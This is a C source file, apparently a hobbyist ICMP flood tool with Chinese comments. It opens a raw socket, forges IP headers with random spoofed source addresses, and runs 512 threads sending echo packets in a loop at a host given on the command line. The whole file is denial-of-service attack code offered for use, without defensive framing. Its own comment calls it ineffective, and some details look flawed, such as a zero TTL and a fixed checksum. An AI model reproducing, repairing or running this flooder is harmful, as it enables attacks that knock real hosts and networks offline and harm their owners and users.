/* 效果不佳没什么用 */
#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/select.h>
#include <sys/types.h>




#define MAXCHILD 512
static unsigned long dest = 0;
static int PROTO_ICMP = -1;
static int alive = -1;
static int rawsock = 0; 


/* 在本文中是需要随机生成ip地址的 */
static inline long myrandom(int begin, int end)
{
	int gap = end - begin + 1;
	int ret = 0;
	srand((unsigned)time(0));
	ret = random() % gap + begin;
	return ret;
}



static void DoS_icmp(void)
{
	struct sockaddr_in to;
	struct ip *iph;
	struct icmp *icmph;
	char *packet;
	int pksize = sizeof(struct ip) + sizeof(struct icmp) + 64;
	packet = malloc(pksize);
	if(packet == NULL)
	{
		perror("malloc()");
		return;
	}

	iph = (struct ip *)packet;
	icmph = (struct icmp *)(packet + sizeof(struct ip));
	memset(packet, 0, pksize);

	iph->ip_v = 4;
	iph->ip_hl = 5;
	iph->ip_tos = 0;
	iph->ip_len = htons(pksize);
	iph->ip_id = htons(getpid());
	iph->ip_off = 0;
	iph->ip_ttl = 0x0;
	iph->ip_p = PROTO_ICMP;
	iph->ip_sum = 0;
	iph->ip_src.s_addr = (unsigned long)myrandom(0, 65535);
	iph->ip_dst.s_addr = dest;

	icmph->icmp_type = ICMP_ECHO;
	icmph->icmp_code = 0;
	icmph->icmp_cksum = htons(~(ICMP_ECHO << 8));

	to.sin_family = AF_INET;
	to.sin_addr.s_addr = iph->ip_dst.s_addr;
	to.sin_port = htons(0);

	sendto(rawsock, packet, pksize, 0, (struct sockaddr *)&to, sizeof(struct sockaddr));
	free(packet);
}

static void * DoS_fun(void * ip)
{
	while(alive)
	{
		DoS_icmp();
	}
	return NULL;
}


/* 获取信号，释放资源并终止进程 */
static void DoS_sig(int signo)
{
	alive = 0;
	printf("stop dos icmp\b");
	return;
}

int main(int argc, char *argv[])
{
	struct hostent *host = NULL;
	struct protoent *protocol = NULL;
	char protoname[] = "icmp";
	int i = 0;

	pthread_t pthread[MAXCHILD];
	

	alive = 1;
	signal(SIGINT, DoS_sig);
	if(argc < 2)
	{
		return -1;
	}

	protocol = getprotobyname(protoname);
	if(protocol == NULL)
	{
		perror("getprotobyname()");
		return -1;
	}
	PROTO_ICMP = protocol->p_proto;

	dest = inet_addr(argv[1]);
	if(dest == INADDR_NONE)
	{
		host = gethostbyname(argv[1]);
		if(host == NULL)
		{
			perror("gethostbyname()");
			return -1;
		}
		memcpy((char *)&dest, host->h_addr, host->h_length);
	}

	rawsock = socket(AF_INET, SOCK_RAW, PROTO_ICMP);
	if(rawsock < 0)
	{
		perror("socket()");
		return -1;
	}
	
	setsockopt(rawsock, SOL_IP, IP_HDRINCL, "1", sizeof("1"));
	for(i = 0; i < MAXCHILD; i++)
	{
		pthread_create(&pthread[i], NULL, DoS_fun, NULL);
	}

	for(i = 0; i < MAXCHILD; i++)
	{
		pthread_join(pthread[i], NULL);
	}

	close(rawsock);
	return 0;
}
